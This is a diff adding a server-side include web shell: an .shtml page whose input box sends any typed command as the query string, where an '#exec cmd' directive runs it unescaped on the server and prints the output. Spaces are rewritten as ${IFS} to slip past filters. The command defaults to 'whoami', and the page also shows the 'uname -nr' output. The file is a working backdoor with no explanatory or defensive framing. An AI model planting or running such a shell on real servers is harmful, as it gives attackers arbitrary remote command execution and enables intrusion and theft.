@@ -1,0 +1,42 @@
+<!--#config errmsg="[error]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="whoami" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+<head>
+<title>jk678j</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function fex()
+{
+	var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+</script>
+<script>
+document.onkeydown = keydown;
+function keydown(e) {
+    if (!e) e = event;
+    if (e.keyCode === 13) {
+    	var uri = document.getElementById('command').value;
+    	var rep = uri.replace(/[ ]/g,'${IFS}');
+		var res = encodeURI(uri);
+        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+
+    }
+}
+</script>
+
+</head>
+<body>
+<font face=courier size=2><i><font color=green><!--#exec cmd="{uname,-nr}" --></font><br>
+<font size=2>sys : <input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;"> <input type=button value=Execute onclick="fex();">
+<hr>
+sdfsd</font><b><!--#echo var=shl --></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#exec cmd=$shl -->
